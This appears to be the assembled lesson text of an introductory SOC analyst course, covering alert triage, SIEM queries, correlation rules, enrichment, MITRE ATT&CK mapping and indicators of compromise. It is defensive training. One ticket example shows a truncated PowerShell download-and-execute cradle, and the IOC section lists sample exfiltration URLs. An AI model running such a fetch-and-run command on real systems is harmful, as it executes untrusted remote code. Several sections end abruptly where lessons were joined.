# Welcome to the Security Operations Center

A **Security Operations Center (SOC)** is the central hub of an organization's cybersecurity defense. It's where security professionals monitor, detect, analyze, and respond to cybersecurity incidents around the clock.

## What is a SOC?

The SOC is essentially the "nerve center" of an organization's security posture. Think of it as a 24/7 security command center where trained analysts watch over the organization's digital assets, looking for signs of malicious activity.

### Core Functions of a SOC

1. **Continuous Monitoring** - 24/7/365 surveillance of networks, endpoints, servers, and applications
2. **Threat Detection** - Identifying potential security incidents through alerts and anomalies
3. **Incident Response** - Taking action to contain and remediate security threats
4. **Threat Intelligence** - Staying informed about emerging threats and attack techniques
5. **Compliance & Reporting** - Maintaining security standards and documenting incidents

## The SOC Mission

The primary mission of a SOC is to **detect, analyze, and respond to cybersecurity incidents** using a combination of technology solutions and a strong set of processes.

> "The SOC's goal is to reduce the time between when a threat enters the environment and when it's detected and contained."

### Key Performance Metrics

| Metric | Description | Target |
|--------|-------------|--------|
| MTTD | Mean Time to Detect | < 1 hour |
| MTTR | Mean Time to Respond | < 4 hours |
| MTTC | Mean Time to Contain | < 24 hours |

## Types of SOC Models

### 1. Internal SOC
- Fully staffed and managed in-house
- Complete control over operations
- Higher cost but maximum customization

### 2. Managed SOC (MSSP)
- Outsourced to a Managed Security Service Provider
- Cost-effective for smaller organizations
- 24/7 coverage without internal staffing challenges

### 3. Hybrid SOC
- Combination of internal team and external services
- Internal team handles critical functions
- MSSP provides overflow and off-hours coverage

## Your Role as a SOC Analyst

As a Level 1 SOC Analyst, you are the **first line of defense**. Your responsibilities include:

- Monitoring security alerts and dashboards
- Performing initial triage of security events
- Documenting and escalating incidents
- Following established procedures and runbooks
- Maintaining situational awareness

### The Analyst Mindset

Successful SOC analysts share these characteristics:

- **Curiosity** - Always asking "why" and digging deeper
- **Attention to Detail** - Small anomalies can indicate big threats
- **Calm Under Pressure** - Incidents require clear thinking
- **Continuous Learning** - The threat landscape constantly evolves
- **Team Collaboration** - Security is a team sport

# SOC Workflows & Shift Handover

Effective SOC operations depend on well-defined workflows and seamless shift transitions. This lesson covers the essential processes that keep a SOC running smoothly.

## The Alert Lifecycle

Every security alert follows a lifecycle from generation to closure:

\`\`\`
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│  Alert   │ → │  Triage  │ → │ Analyze  │ → │ Respond  │ → │  Close   │
│ Generated│   │          │   │          │   │          │   │          │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
     ↓              ↓              ↓              ↓              ↓
  Detection    L1 Review     Investigation   Containment    Document
   Rules       & Priority    & Enrichment    & Recovery    & Lessons
\`\`\`

## Alert Triage Workflow

### Step 1: Initial Assessment
- Review alert details (type, severity, source)
- Check for related alerts
- Gather initial context

### Step 2: Quick Wins Check
\`\`\`
□ Known false positive?
□ Scheduled maintenance window?
□ Expected activity (scan, pentest)?
□ Duplicate of existing ticket?
\`\`\`

### Step 3: Investigation
- Enrich IOCs (IP, hash, domain)
- Review related logs
- Check affected assets

### Step 4: Decision
- **False Positive** → Document and close
- **True Positive** → Escalate to L2
- **Needs More Info** → Continue investigation

## Ticketing & Documentation

Every alert interaction must be documented. Good documentation:

### Ticket Structure
\`\`\`markdown
## Alert Summary
- Alert Name: [Detection Name]
- Severity: [Critical/High/Medium/Low]
- Time: [Timestamp]
- Affected Asset: [Hostname/IP]

## Initial Findings
[What you observed during triage]

## Investigation Steps
1. [Action taken]
2. [Action taken]
3. [Action taken]

## Conclusion
[True Positive / False Positive / Needs Escalation]

## Recommendations
[If applicable]
\`\`\`

### Documentation Best Practices
- Be specific and factual
- Include timestamps
- Reference evidence (screenshots, log entries)
- Avoid jargon unless necessary
- Write for the next analyst who reviews this

## Escalation Procedures

### When to Escalate

**Immediate Escalation Required:**
- Confirmed malware execution
- Active data exfiltration
- Ransomware indicators
- Compromised privileged account
- Critical system affected

**Escalate After Initial Triage:**
- Complex investigation needed
- Multiple systems affected
- Unknown malware
- Insider threat indicators

### Escalation Checklist
\`\`\`
□ Document all findings so far
□ Preserve relevant evidence
□ Identify affected systems and users
□ Note any containment actions taken
□ Provide timeline of events
□ Include all IOCs discovered
\`\`\`

## Shift Handover Process

Smooth shift transitions are critical for 24/7 operations.

### Pre-Handover (Outgoing Shift)
1. Review all open tickets
2. Document current status of ongoing incidents
3. Note any pending actions
4. Prepare handover summary

### Handover Meeting (15-30 minutes)
\`\`\`
1. Shift Summary
   - Total alerts processed
   - Incidents opened/closed
   - Major events

2. Active Incidents
   - Current status

## Using ATT&CK in the SOC

### 1. Alert Mapping

Map your detection rules to ATT&CK:

\`\`\`
Alert: "Suspicious PowerShell Execution"
├── Tactic: Execution
├── Technique: T1059.001 (PowerShell)
└── Detection: Script block with encoded commands
\`\`\`

### 2. Investigation Context

When investigating an alert:

\`\`\`
1. Identify the technique observed
2. Check what tactics it falls under
3. Look for related techniques (same tactic)
4. Anticipate next likely techniques
5. Search for those behaviors
\`\`\`

### 3. Attack Chain Analysis

\`\`\`
Initial Access → Execution → Persistence → Discovery → Lateral Movement
     ↓              ↓            ↓            ↓              ↓
  T1566.001     T1059.001    T1547.001    T1083        T1021.002
  Phishing      PowerShell   Registry     File         SMB/Admin
  Attachment                 Run Keys     Discovery     Shares
\`\`\`

## ATT&CK Navigator

The ATT&CK Navigator is a web-based tool for visualizing coverage:

**Use Cases:**
- Highlight techniques your tools detect
- Map an incident across the matrix
- Compare coverage across security tools
- Visualize threat actor TTPs

### Creating a Layer

1. Go to ATT&CK Navigator
2. Create new layer
3. Select techniques to highlight
4. Add colors for different meanings
5. Export for reporting

## Data Sources

ATT&CK maps techniques to data sources needed for detection:

| Data Source | Example |
|-------------|---------|
| Process | Process creation, command line |
| File | File creation, modification |
| Network Traffic | Connection, DNS queries |
| Windows Registry | Registry modification |
| Authentication | Logon events |

# Why Logs Matter in Security

Logs are the foundation of security operations. Without logs, we're blind to what's happening in our environment. This lesson explains why logs are critical and how they enable detection and investigation.

## The Importance of Logging

> "If a tree falls in a forest and no one is around to hear it, does it make a sound? In cybersecurity, if an attack happens and there's no log, it didn't happen."

### Logs Enable:

1. **Detection** - Identifying malicious activity
2. **Investigation** - Understanding what happened
3. **Forensics** - Reconstructing incidents
4. **Compliance** - Meeting regulatory requirements
5. **Troubleshooting** - Diagnosing issues

## Hunting Patterns

### Brute Force Detection
\`\`\`
Event ID: 4625 (Failed logons)
Pattern: Same target, multiple failures
Time: Within short window (minutes)
Threshold: >5 failures in 5 minutes
\`\`\`

### Lateral Movement
\`\`\`
Event ID: 4624 (Successful logon)
Logon Type: 3 (Network) or 10 (RDP)
Pattern: Same account, multiple systems
Correlation: Following 4625 failures
\`\`\`

### Privilege Escalation
\`\`\`
Event IDs: 4728, 4732 (Group membership)
Groups: Administrators, Domain Admins
Pattern: Unexpected additions
Context: Who made the change?
\`\`\`

### Suspicious Process Chains
\`\`\`
Parent: outlook.exe
Child: powershell.exe
Grandchild: cmd.exe → whoami

Analysis: Email client spawning scripting interpreters
Verdict: Likely malicious macro execution

\`\`\`

## Analysis Questions

### Question 1: Initial Access
- What type of attack was attempted first?
- Was it successful? What evidence supports this?
- What account was compromised?

### Question 2: Execution
- What commands were executed?
- What is the encoded PowerShell command likely doing?
- What is the parent-child process relationship?

### Question 3: Command & Control
- What IP address is the C2 server?
- What domain resolves to this IP?
- What pattern suggests C2 beaconing?

### Question 4: Data Exfiltration
- Is there evidence of data theft?
- How much data may have been exfiltrated?
- When did this occur?

## Analysis Walkthrough

### Step 1: Timeline Construction

\`\`\`
18:45:00 - Brute force attack begins from 192.168.1.50
18:52:00 - 47+ failed login attempts
18:53:00 - Successful login with svc_backup account (Type 3 = Network)
18:55:00 - cmd.exe executes whoami (reconnaissance)
18:56:00 - PowerShell with encoded command (malware download?)
18:59:00 - DNS lookup for update-service.net
19:00:00 - First C2 beacon to 45.33.32.156:443
19:05-19:15 - Regular beaconing pattern (every 5 min)
23:00:00 - Large outbound transfer (50MB) - exfiltration
\`\`\`

### Step 2: Attack Chain (MITRE ATT&CK)

| Phase | Technique | Evidence |
|-------|-----------|----------|
| Initial Access | T1110 Brute Force | 47 failed logins |
| Credential Access | T1110.001 Password Guessing | Multiple usernames tried |
| Execution | T1059.001 PowerShell | Encoded PowerShell command |
| Discovery | T1033 System Owner | whoami command |
| C2 | T1071.001 Web Protocols | HTTPS to 45.33.32.156 |
| Exfiltration | T1041 Exfil Over C2 | 50MB transfer at 23:00 |

### Step 3: IOC Extraction

\`\`\`
IP Addresses:
- 192.168.1.50 (Attacker source - internal?)
- 45.33.32.156 (C2 server)

Domains:
- update-service.net

Accounts:
- svc_backup (compromised)

Files/Commands:
- Encoded PowerShell command
- C:\\Windows\\System32\\cmd.exe

# What is a SIEM?

A Security Information and Event Management (SIEM) system is the cornerstone of modern security operations. It aggregates, correlates, and analyzes log data from across your environment to detect threats.

## SIEM Definition

**SIEM** = **S**ecurity **I**nformation and **E**vent **M**anagement

A SIEM combines two capabilities:
- **SIM (Security Information Management)**: Log collection, storage, and compliance reporting
- **SEM (Security Event Management)**: Real-time monitoring, correlation, and alerting

## Core SIEM Functions

\`\`\`

## How a SIEM Works

### 1. Data Collection

\`\`\`
Sources:
┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│   Endpoints  │  │   Network    │  │    Cloud     │
│   (Agents)   │  │   (Syslog)   │  │    (APIs)    │
└──────┬───────┘  └──────┬───────┘  └──────┬───────┘
       │                 │                 │
       └─────────────────┼─────────────────┘
                         ↓
                   ┌───────────┐
                   │   SIEM    │
                   └───────────┘
\`\`\`

### 2. Parsing & Normalization

Raw logs are transformed into structured, searchable data:

**Before (Raw):**
\`\`\`
Jan 15 10:30:00 server01 sshd[12345]: Failed password for admin from 192.168.1.100 port 54321 ssh2
\`\`\`

**After (Normalized):**
\`\`\`json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "source": "server01",
  "event_type": "authentication",
  "outcome": "failure",
  "user": "admin",
  "source_ip": "192.168.1.100",
  "service": "ssh"
}
\`\`\`

### 3. Correlation & Detection

The SIEM applies rules to identify threats:

**Simple Rule:**
\`\`\`
IF event_type = "authentication" 
AND outcome = "failure" 
AND count > 5 within 5 minutes
THEN alert "Potential Brute Force"
\`\`\`

**Complex Correlation:**
\`\`\`
IF (failed_logins > 5 from source_ip)
AND THEN (successful_login from same source_ip)
AND THEN (new_process = "powershell.exe" on same host)
WITHIN 10 minutes
THEN alert "Successful Brute Force with Post-Exploitation"
\`\`\`

### 4. Alerting & Response

When rules match, the SIEM:
- Creates an alert with severity
- Enriches with context
- Notifies analysts
- Optionally triggers automation (SOAR)

## Major SIEM Platforms

| Platform | Type | Strengths |
|----------|------|-----------|
| **Splunk** | Commercial | Powerful SPL, extensive ecosystem |
| **Microsoft Sentinel** | Cloud | Azure integration, AI/ML |
| **Elastic Security** | Open Source | Scalable, free tier available |

# Basic Search Queries

Learning to write effective SIEM queries is essential for SOC analysts. This lesson covers fundamental search concepts that apply across most SIEM platforms.

## Search Query Basics

### Query Structure

Most SIEM queries follow this pattern:

\`\`\`
[DATA SOURCE] [FILTERS] [TRANSFORMATIONS] [OUTPUT]
\`\`\`

**Example (Splunk SPL):**
\`\`\`
index=security sourcetype=WinEventLog EventCode=4625 
| stats count by src_ip 
| sort -count 
| head 10
\`\`\`

**Breakdown:**
- \`index=security\` - Data source
- \`sourcetype=WinEventLog EventCode=4625\` - Filters
- \`stats count by src_ip\` - Transformation (aggregation)
- \`sort -count | head 10\` - Output formatting

## Common Query Patterns

### 1. Simple Filtering

Find events matching specific criteria:

\`\`\`
# All failed logins
EventCode=4625

# Failed logins for specific user
EventCode=4625 user="admin"

# Failed logins from specific IP
EventCode=4625 src_ip="192.168.1.100"

# Combining filters
EventCode=4625 user="admin" src_ip="192.168.1.100"
\`\`\`

### 2. Wildcard Searches

Match patterns with wildcards:

\`\`\`
# Any user starting with "admin"
user=admin*

# Any domain ending in .xyz
domain=*.xyz

# Contains "password" anywhere
*password*
\`\`\`

### 3. Time-Based Queries

Scope searches to specific time ranges:

\`\`\`
# Last 24 hours
earliest=-24h latest=now

# Specific date range
earliest="01/15/2024:00:00:00" latest="01/16/2024:00:00:00"

# Last business day
earliest=-1d@d latest=@d
\`\`\`

### 4. Aggregation Queries

Summarize data:

\`\`\`
# Count events by user
| stats count by user

# Count events by source IP and user
| stats count by src_ip, user

# Get earliest and latest time by user
| stats earliest(_time) as first_seen, latest(_time) as last_seen by user

# Calculate average, min, max
| stats avg(bytes) min(bytes) max(bytes) by src_ip
\`\`\`

### 5. Sorting and Limiting

Control output:

\`\`\`
# Sort by count descending
| sort -count

# Sort by count ascending
| sort count

# Limit to top 10
| head 10

# Limit to bottom 10
| tail 10
\`\`\`

## Security Use Case Queries

### Brute Force Detection

\`\`\`
# Find IPs with many failed logins
EventCode=4625
| stats count by src_ip
| where count > 10
| sort -count
\`\`\`

### Successful Login After Failures

\`\`\`
# Track failed then successful logins
(EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
        count(eval(EventCode=4624)) as successes by src_ip, user
| where failures > 5 AND successes > 0
\`\`\`

### Suspicious Process Execution

\`\`\`
# PowerShell with encoded commands
EventCode=4688 
| search CommandLine="*-enc*" OR CommandLine="*-encoded*"
| table _time, ComputerName, User, CommandLine
\`\`\`

### Outbound Connection Analysis

\`\`\`
# Large outbound transfers
action=allowed direction=outbound
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
| where total_bytes > 100000000
| sort -total_bytes
\`\`\`

### User Activity Timeline

\`\`\`
# All activity for a specific user
user="jsmith"
| sort _time
| table _time, src_ip, action, dest, details
\`\`\`

## Query Building Tips

### Start Broad, Then Narrow

\`\`\`
Step 1: EventCode=4625
Step 2: EventCode=4625 | stats count by src_ip
Step 3: EventCode=4625 | stats count by src_ip | where count > 10
Step 4: EventCode=4625 | stats count by src_ip | where count > 10 | sort -count | head 10
\`\`\`

### Use Field Discovery

Before querying:
1. Check what fields are available
2. Understand field names and values
3. Verify data types

### Test Incrementally

Build queries step by step:
\`\`\`
# Test each part
EventCode=4625                              # Check base filter
EventCode=4625 | stats count               # Verify count works
EventCode=4625 | stats count by src_ip     # Add grouping
\`\`\`

## Common Operators

| Operator | Description | Example |
|----------|-------------|---------|
| = | Equals | user="admin" |
| != | Not equals | action!="allowed" |
| > < | Greater/Less than | count > 10 |
| AND | Both conditions | user="admin" AND action="login" |
| OR | Either condition | EventCode=4624 OR EventCode=4625 |
| NOT | Exclude | NOT action="allowed" |
| IN | Multiple values | EventCode IN (4624, 4625, 4648) |
    `,
    keyTakeaways: [
      "Queries follow a pattern: data source → filters → transformations → output",
      "Use wildcards (*) for pattern matching and partial searches",
      "Aggregation commands (stats, count, sum) summarize large datasets",
      "Always start broad and narrow down based on results",
      "Build queries incrementally and test each step"
    ],

# Correlation Rules & Alerts

Correlation rules are the detection logic that transforms raw events into actionable security alerts. Understanding how they work helps you investigate alerts effectively and suggest improvements.

## What is Correlation?

**Correlation** connects related events to identify patterns that individual events wouldn't reveal.

### Single Event vs. Correlation

**Single Event Detection:**
\`\`\`
Event: Failed login
Action: Maybe alert, maybe not (too noisy)
\`\`\`

**Correlated Detection:**
\`\`\`
Pattern: 10+ failed logins → successful login → PowerShell execution
Within: 5 minutes
From: Same source IP
Action: HIGH priority alert
\`\`\`

## Types of Correlation Rules

### 1. Threshold-Based

Trigger when count exceeds limit:

\`\`\`
Rule: Brute Force Detection
Condition: Failed logins > 10 in 5 minutes
Group By: Source IP
Severity: Medium
\`\`\`

### 2. Sequence-Based

Events must occur in order:

\`\`\`
Rule: Successful Attack Chain
Sequence:
  1. Failed logins (>5)
  2. Successful login
  3. Process execution
Time Window: 10 minutes
Group By: Source IP, Target Host
Severity: High
\`\`\`

### 3. Statistical/Anomaly

Deviation from baseline:

\`\`\`
Rule: Unusual Data Transfer
Condition: Outbound bytes > 3 standard deviations from baseline
Baseline: 30-day rolling average
Group By: Source IP
Severity: Medium
\`\`\`

### 4. Threat Intelligence

## Alert Tuning

### Common Tuning Approaches

1. **Whitelist known-good activity**
   - Vulnerability scanners
   - Backup systems
   - Service accounts

2. **Adjust thresholds**
   - Too many alerts? Raise threshold
   - Missing detections? Lower threshold

3. **Refine time windows**
   - Too short = fragmented detection
   - Too long = delayed alerts

4. **Add context filters**
   - Business hours vs. off-hours
   - Production vs. development
   - Privileged vs. standard users

### Tuning Request Format

When requesting tuning:

\`\`\`
Rule Name: Brute Force Detection
Current Issue: High false positive rate
Proposed Change: Add whitelist for vulnerability scanner IPs
Business Justification: Scanner IPs (192.168.100.0/24) trigger 50+ alerts/day
Risk Assessment: Low - these are known internal scanners

# Understanding Security Alerts

Security alerts are the lifeblood of SOC operations. Understanding their anatomy, sources, and significance is crucial for effective triage and response.

## What is a Security Alert?

A **security alert** is a notification generated when a detection rule identifies potentially malicious or suspicious activity. It's a signal that requires human analysis.

# The Triage Process

Triage is the process of quickly assessing alerts to determine their validity and priority. An efficient triage process is essential for managing alert volume effectively.

## Triage Goals

1. **Validate** - Is this alert legitimate?
2. **Prioritize** - How urgent is this?
3. **Enrich** - What context do we need?
4. **Decide** - Close, investigate, or escalate?

## Step-by-Step Triage

### Step 1: Initial Assessment

**Questions to Answer:**
- What detection rule triggered this?
- What severity was assigned?
- When did this occur?
- What asset is affected?

**Quick Check:**
\`\`\`
□ Alert is recent (not stale)
□ Alert is not a duplicate
□ Source system is valid
□ Data appears complete
\`\`\`

### Step 2: Quick Wins Check

Before deep-diving, check for easy closures:

\`\`\`
□ Is this a known false positive pattern?
□ Is there planned maintenance/testing?
□ Is this an authorized security scan?
□ Is this expected business activity?
□ Is this a duplicate of an open ticket?
\`\`\`

**If YES to any:** Document and close with appropriate reason.

### Step 3: IOC Enrichment

Gather intelligence on indicators:

**For IP Addresses:**
- Reputation (VirusTotal, AbuseIPDB)
- Geolocation
- Owner (WHOIS)
- Previous activity in environment

**For Domains:**
- Registration date
- Category
- Associated IPs
- DNS history

**For File Hashes:**
- Antivirus detection rate
- Sandbox results
- First seen date
- Associated campaigns

### Step 4: Context Gathering

**Asset Context:**
- What type of system?
- Business criticality?
- Normal activity patterns?
- Recent changes?

**User Context:**
- Role and department?
- Normal working hours?
- Current location?
- Account privileges?

### Step 5: Decision and Action

**Decision Matrix:**

| Finding | Action |
|---------|--------|
| Confirmed False Positive | Document pattern, close, consider tuning |
| Likely False Positive | Document reasoning, close |
| Uncertain | Continue investigation or escalate |
| Likely True Positive | Escalate immediately, begin documentation |
| Confirmed True Positive | Escalate immediately, initiate response |

## Triage Documentation

Always document your triage:

\`\`\`markdown
## Triage Summary
- Alert ID: ALT-2024-001234
- Triage Time: 2024-01-15 10:35:00
- Analyst: jdoe

## Findings
[What you observed]

## Investigation Steps
1. Checked IOC reputation - clean
2. Reviewed user activity - normal pattern
3. Verified scheduled maintenance window

## Conclusion
FALSE POSITIVE - Scheduled vulnerability scan

## Recommendation
Add scanner IPs to allowlist for this rule

# True Positive vs False Positive

Distinguishing between real threats and false alarms is the core skill of alert triage. This lesson covers techniques to make accurate determinations.

## Classification Definitions

| Classification | Definition |
|----------------|------------|
| **True Positive (TP)** | Alert correctly identifies malicious activity |
| **False Positive (FP)** | Alert incorrectly flags benign activity |
| **True Negative (TN)** | No alert for benign activity (correct) |
| **False Negative (FN)** | No alert for malicious activity (missed threat) |

## The Decision Challenge

\`\`\`
                    ACTUAL STATE
                  Malicious    Benign
              ┌─────────────┬─────────────┐
    Alert     │    TRUE     │    FALSE    │
   Triggered  │  POSITIVE   │  POSITIVE   │
              ├─────────────┼─────────────┤
    No Alert  │    FALSE    │    TRUE     │
              │  NEGATIVE   │  NEGATIVE   │
              └─────────────┴─────────────┘
\`\`\`

## True Positive Indicators

Signs that an alert is likely a real threat:

### Strong TP Indicators

**Technical Evidence:**
- Known malicious IOCs (confirmed by multiple sources)
- Behavior matches known attack patterns
- Multiple correlated alerts
- Unusual activity for the asset/user
- Connections to known bad infrastructure

**Contextual Evidence:**
- Activity outside normal hours
- Unusual geographic location
- Privileged actions by non-privileged user
- No business justification
- Attempts to evade detection

### Example True Positive

\`\`\`
Alert: PowerShell Encoded Command
Host: WKS-ACCT01
User: jsmith
Time: 03:00 AM (user normally works 9-5)
Parent Process: WINWORD.EXE
Destination: IP flagged in 3 threat feeds

Analysis:
✓ Unusual time for this user
✓ Word spawning PowerShell is suspicious
✓ Encoded command (evasion)
✓ Connection to known malicious IP

Verdict: TRUE POSITIVE
\`\`\`

## False Positive Indicators

Signs that an alert is likely benign:

### Common FP Scenarios

**Legitimate Tools:**
- Security scanners
- IT management tools
- Developer activity
- Backup software

**Business Activity:**
- Scheduled tasks
- Approved testing
- Normal user behavior
- Expected integrations

**Rule Issues:**
- Overly broad detection logic
- Missing exclusions
- Threshold too low
- Outdated signatures

### Example False Positive

\`\`\`
Alert: Port Scan Detected
Source: 192.168.100.50
Target: Multiple internal hosts
Ports: 22, 80, 443, 3389

Analysis:
✓ Source is known vulnerability scanner
✓ Scan matches scheduled assessment window
✓ Security team confirmed authorized activity
✓ Same pattern every Tuesday

Verdict: FALSE POSITIVE
Recommendation: Add scanner to allowlist
\`\`\`

## Investigation Techniques

### 1. IOC Verification

\`\`\`
Check IP/Domain/Hash against:
├── VirusTotal
├── AbuseIPDB
├── URLhaus
├── AlienVault OTX
├── Internal threat intel
└── Historical data

Scoring:
• Flagged by multiple sources = Higher confidence malicious
• Clean everywhere = Likely benign
• Mixed results = Needs more investigation
\`\`\`

### 2. Behavioral Analysis

Compare to baseline:
- Is this normal for this user?
- Is this normal for this system?
- Is this normal for this time?
- Is this normal for this network?

### 3. Process Chain Analysis

Examine parent-child relationships:

**Suspicious Chain:**
\`\`\`
outlook.exe → powershell.exe → cmd.exe → whoami.exe
(Email client spawning scripting interpreter = BAD)
\`\`\`

**Normal Chain:**
\`\`\`
explorer.exe → powershell.exe (user opened)
services.exe → svchost.exe (system process)
\`\`\`

### 4. Timeline Correlation

Look for related events:
- What happened before?
- What happened after?
- Are there similar events on other systems?

## When You're Unsure

If you can't determine TP vs FP:

1. **Document your analysis** - What you checked, what you found
2. **Escalate to L2** - Don't guess on high-severity alerts
3. **Err on the side of caution** - Better to escalate than miss
4. **Request additional context** - Contact asset owner if needed
5. **Set follow-up reminder** - Monitor for additional activity

# Enrichment & Context Gathering

Enrichment adds valuable context to alerts, transforming raw data into actionable intelligence. This lesson covers the tools and techniques for effective enrichment.

## What is Enrichment?

**Enrichment** is the process of adding context and intelligence to security data to aid investigation and decision-making.

\`\`\`
Raw Alert:                    Enriched Alert:
IP: 203.0.113.50      →      IP: 203.0.113.50
                              • Location: Russia
                              • Reputation: Malicious (95%)
                              • Associated: Cobalt Strike C2
                              • First seen: 2024-01-10
                              • Our exposure: 3 connections
\`\`\`

## Types of Enrichment

### 1. Threat Intelligence

**IOC Reputation:**
- IP address reputation
- Domain categorization

### Internal Sources

\`\`\`
Asset Database (CMDB)
├── System inventory
├── Business owners
├── Criticality ratings
└── Network location

Identity System (AD/IAM)
├── User attributes
├── Group memberships
├── Account status
└── Privilege level

SIEM Historical Data
├── Previous alerts
├── User activity logs
└── Connection history
\`\`\`

## Enrichment Workflow

### Step 1: Extract IOCs

From the alert, identify:
\`\`\`
□ IP addresses (source and destination)
□ Domain names
□ File hashes (MD5, SHA1, SHA256)
□ URLs
□ Email addresses
□ File names
\`\`\`

### Step 2: Query Reputation

For each IOC:
\`\`\`
1. Check VirusTotal
   - Detection ratio
   - Behavioral analysis
   - Community comments

2. Check AbuseIPDB (for IPs)
   - Abuse reports
   - Categories
   - Confidence score

3. Check internal TIP
   - Previous sightings
   - Associated incidents
\`\`\`

### Step 3: Gather Asset Context

\`\`\`
Query CMDB/Asset Database:
├── What type of system?
├── What does it do?
├── Who owns it?
├── How critical is it?
└── What network zone?
\`\`\`

### Step 4: Gather User Context

\`\`\`
Query Identity System:
├── Who is this user?
├── What's their role?
├── What access do they have?
├── Is this normal behavior?
└── Are they currently active?
\`\`\`

### Step 5: Check Historical Data

\`\`\`
Query SIEM:
├── Previous alerts for this asset?
├── Previous alerts for this user?
├── Previous connections to this destination?
├── Similar activity across environment?
└── Known false positive pattern?
\`\`\`

## Automation Opportunities

### Auto-Enrichment

Many SOCs automate enrichment:

\`\`\`yaml
on_alert:
  - extract_iocs
  - lookup_virustotal(iocs.ips, iocs.hashes, iocs.domains)
  - lookup_abuseipdb(iocs.ips)
  - query_cmdb(alert.host)
  - query_identity(alert.user)
  - attach_results_to_alert
\`\`\`

### Benefits of Automation:
- Faster triage
- Consistent enrichment
- Reduced analyst workload
- Better decision support
    `,
    keyTakeaways: [
      "Enrichment adds threat intel, asset, user, and historical context to alerts",
      "Use free OSINT tools like VirusTotal, AbuseIPDB, and Shodan",
      "Query internal systems (CMDB, IAM) for asset and user context",
      "Check historical data for previous alerts and known patterns",
      "Automate enrichment to speed up triage and ensure consistency"
    ]

### Documentation Best Practices

**Be Specific:**
\`\`\`
❌ "Checked the logs, looked suspicious"
✓ "Reviewed Windows Security logs, found 47 failed logins 
   (Event ID 4625) from IP 192.168.1.100 between 14:00-14:15"
\`\`\`

**Include Evidence:**
\`\`\`
❌ "User ran a bad command"
✓ "Process: powershell.exe
   Command: IEX (New-Object Net.WebClient).DownloadString('http://...')
   Parent: WINWORD.EXE
   Time: 2024-01-15 14:30:00"
\`\`\`

**Be Objective:**
\`\`\`
❌ "This is definitely malware"
✓ "Hash matches known Emotet sample per VirusTotal (58/71 detections)"
\`\`\`

## Escalation Guidelines

### When to Escalate Immediately

**Critical Situations:**
- Active ransomware
- Confirmed data exfiltration
- Compromised privileged account
- Business-critical system affected

- What triggered your investigation
- What you found (with evidence)
- What you couldn't determine
- Current status of affected assets
- Any time-sensitive factors

**How to Communicate:**
- Use designated escalation channels
- Be concise but complete
- Provide ticket/case reference
- Remain available for questions

# Introduction to Threat Intelligence

**Threat Intelligence (TI)** is evidence-based knowledge about threats that helps organizations make informed security decisions. For SOC analysts, threat intelligence transforms raw data into actionable insights.

## What is Threat Intelligence?

Threat intelligence goes beyond simple data collection. It involves:

- **Collection** - Gathering data from various sources
- **Processing** - Normalizing and structuring the data
- **Analysis** - Finding patterns and meaning
- **Dissemination** - Sharing insights with stakeholders

> "Data becomes information, information becomes intelligence, and intelligence drives action."

## Types of Threat Intelligence

### 1. Strategic Intelligence
- High-level trends and patterns
- Business risk assessments
- Consumed by executives and management
- Example: "Ransomware attacks increased 150% in healthcare"

### 2. Tactical Intelligence
- TTPs (Tactics, Techniques, Procedures)
- How adversaries operate
- Consumed by security architects and defenders
- Example: "APT29 uses spear-phishing with COVID-themed lures"

### 3. Operational Intelligence
- Details about specific attacks
- Campaign information and timelines
- Consumed by IR teams and threat hunters
- Example: "Upcoming DDoS attack planned for Black Friday"

### 4. Technical Intelligence
- Specific indicators of compromise (IOCs)
- Machine-readable data
- Consumed by SOC analysts and automated tools
- Example: "Malicious IP: 192.168.1.100, Hash: abc123..."

| Intelligence Type | Consumer | Refresh Rate | Format |
|-------------------|----------|--------------|--------|
| Strategic | Executives | Monthly/Quarterly | Reports |
| Tactical | Security Teams | Weekly | TTPs, Playbooks |
| Operational | IR/Hunters | Daily | Advisories |
| Technical | SOC/Tools | Real-time | IOCs, Feeds |

## How SOC Analysts Use Threat Intelligence

### During Alert Triage
1. Check if source/destination IPs are known malicious
2. Compare file hashes against threat intel databases
3. Look for known C2 domains in network traffic
4. Match behavior patterns to known TTPs

### For Enrichment
\`\`\`
Alert: Suspicious PowerShell execution
     ↓
Threat Intel Enrichment:
- Command pattern matches APT28 technique
- Similar commands seen in recent campaign
- Associated with ransomware delivery
     ↓
Elevated Priority: High
\`\`\`

### Proactive Defense
- Block known malicious indicators
- Hunt for IOCs in your environment
- Update detection rules based on new TTPs

## Building Your TI Mindset

As a SOC analyst, develop these habits:

1. **Question everything** - Don't blindly trust intel feeds
2. **Verify sources** - Check credibility and freshness
3. **Context matters** - Intel must be relevant to your environment
4. **Share back** - Contribute to the community
5. **Stay current** - Threats evolve rapidly

# Indicators of Compromise (IOCs)

**Indicators of Compromise** are forensic artifacts that identify potentially malicious activity. They're the "fingerprints" that attackers leave behind.

## Common IOC Types

### 1. File-Based Indicators

**Hash Values**
- **MD5** - 32 characters (legacy, collision-prone)
- **SHA1** - 40 characters (being phased out)
- **SHA256** - 64 characters (current standard)

\`\`\`
Example SHA256:
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
\`\`\`

**File Metadata**
- File names (e.g., "invoice.pdf.exe")
- File sizes
- Compilation timestamps
- Digital signature status

### 2. Network Indicators

**IP Addresses**
\`\`\`
- C2 Server: 185.234.218.45
- Malware Distribution: 91.109.190.68
- Spam Source: 45.89.127.34
\`\`\`

**Domain Names**
- C2 domains: evil-domain.xyz
- DGA patterns: aj3k2hf9.com
- Typosquatting: micr0soft.com

**URLs**
\`\`\`
http://malicious.site/download/payload.exe
https://legit-looking.com/api/exfil?data=base64...
\`\`\`

### 3. Host-Based Indicators

**Registry Keys**
\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareName
HKCU\\Software\\MaliciousApp\\Config
\`\`\`

**File Paths**
\`\`\`
C:\\Users\\Public\\malware.exe
C:\\Windows\\Temp\\suspicious.dll
%APPDATA%\\Roaming\\backdoor.exe
\`\`\`

**Mutex Names**
- Used by malware to prevent multiple instances
- Often unique to malware families

### 4. Behavioral Indicators

| Behavior | Detection Method |
|----------|------------------|
| Unusual process spawning | Process monitoring |
| Registry persistence | Registry auditing |
| Network beaconing | Traffic analysis |
| Credential access | Authentication logs |

## The Pyramid of Pain

David Bianco's Pyramid of Pain illustrates how difficult it is for attackers to change different IOC types:

